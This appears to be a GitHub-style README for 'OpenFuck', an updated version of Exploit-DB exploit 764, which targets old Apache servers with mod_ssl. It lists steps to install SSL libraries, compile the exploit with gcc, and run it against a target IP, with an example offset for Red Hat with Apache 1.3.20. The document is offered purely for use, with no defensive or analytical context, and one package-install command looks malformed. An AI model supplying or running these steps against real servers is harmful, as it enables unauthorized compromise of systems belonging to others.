# OpenFuck
This is a tool to exploit apache server

## Usage
This Exploit (https://www.exploit-db.com/exploits/764/) is outdated. Here you can take updated

1.Download 764.c



2.Install libssl-dev & libssl1.0dev
~~~
sudo apt install libssl-dev
sudo apt install libssl1.0 dev
~~~

3.Now Compile
~~~
gcc -o OpenFuck 764.c -lcrypto
~~~
4.Run the exploit
~~~
./OpenFuck
~~~
5.See which service you want to exploit. For example if you need to exploit Red Hat Linux, using apache version 1.3.20.

#For Example
~~~
./OpenFuck 0*6b [IP Address] -c 50
~~~
